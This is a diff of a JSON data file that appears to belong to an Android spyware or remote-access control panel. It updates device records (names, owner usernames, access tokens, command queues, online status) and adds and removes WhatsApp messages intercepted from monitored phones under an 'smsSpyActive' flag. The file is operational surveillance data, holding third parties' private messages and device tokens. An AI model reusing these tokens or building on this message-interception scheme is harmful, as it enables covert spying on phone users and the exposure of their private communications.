@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776777762794,
+    "lastSeen": 1776777781116,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (101 pesan): ~ FIKZ 26 STR",
+        "content": "📷 OP 140++ LOG GGL SOEK GANTENG GINI MASA KGK ADA YG MAU",
+        "time": "21/04 20:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776777782502
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10320,14 +10328,6 @@
         "time": "21/04 19:45",
         "pkg": "com.whatsapp",
         "receivedAt": 1776775517151
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB JB APK BUG BY ZIDE × KYY😈 (189 pesan): ~ zalroq",
-        "content": "lu aja member bukan admin",
-        "time": "21/04 19:45",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775516929
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776777761138,
+    "lastSeen": 1776777782164,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776777760131,
+    "lastSeen": 1776777781219,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
